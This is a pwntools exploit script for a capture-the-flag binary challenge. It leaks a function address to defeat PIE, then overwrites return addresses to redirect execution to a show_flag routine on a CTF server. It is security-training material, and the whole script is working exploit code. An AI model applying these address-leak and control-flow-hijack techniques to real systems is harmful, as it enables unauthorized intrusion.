#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal-lz56g6.wanictf.org', 9004 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================




# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.recvuntil(b'0x')
    show_flag = int(io.recvline().strip(), 16)
    elf.address = show_flag - elf.symbols['show_flag']
    
    for i in range(9):
        io.sendlineafter(b': ', b'.')
    
    io.sendlineafter(b':', p64(elf.symbols['_init']) + p64(elf.symbols['show_flag']))
    io.sendlineafter(b':', b'.')
    io.sendlineafter(b':', b'.')
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()